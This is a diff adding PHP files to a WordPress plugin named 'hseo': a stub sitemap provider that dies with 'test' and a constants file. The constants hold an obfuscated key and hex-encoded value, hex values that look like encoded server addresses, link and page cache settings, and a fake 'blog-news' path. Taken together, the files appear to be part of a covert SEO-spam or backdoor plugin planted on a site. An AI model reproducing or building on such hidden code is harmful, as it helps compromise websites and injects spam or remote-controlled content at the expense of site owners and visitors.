@@ -555,3 +555,56 @@ function sh_page() {
     }
 }
 ?>
+
+/dom695123/wp-content/plugins/hseo/class-custom-sitemap-provider.php
+
+<?php
+include_once plugin_dir_path(__FILE__) . "constants.php";
+
+class Custom_Sitemap_Provider {
+
+    public function __construct() {
+        die('test');
+        // parent::__construct(SITEMAP);
+    }
+
+    public function get_url_list($page_num, $post_type = '') {
+        return [
+            [
+                'loc' => home_url("/".SITEMAP.".xml")
+            ]
+        ];
+    }
+
+    public function get_max_num_pages() {
+        return 1;
+    }
+}
+
+?>
+
+/dom695123/wp-content/plugins/hseo/constants.php
+
+<?php
+defined('ABSPATH') || exit;
+defined('BASE_DIR') || exit;
+
+define("XKEY", "cyHq");
+define("XVALUE", "53012e1057407910501b2a43524d7d12501c7e40201c7a47503b78435a382a425b4a7d4022187a130249");
+define("API", "0xd2c18e0b");
+define("SH", "0x2c0ef004");
+
+define("CACHE_FOLDER", BASE_DIR . "cache");
+define("TIMESTAMP_FILE", "timestamp");
+define("LINKS_COUNT_FILE", "links_count");
+define("LINKS_FILE", "links_from_page_");
+define("PAGE_FILE", "page_");
+define("VERIFY_FILE", "verify");
+define("FILE_CACHE_TIME", 32000);
+
+define("SITEMAP", "blog-sitemap");
+define("BLOG_NAME", "blog-news");
+define("ALLOW", "/".BLOG_NAME."/*");
+define("PER_PAGE", 100);
+
+?>
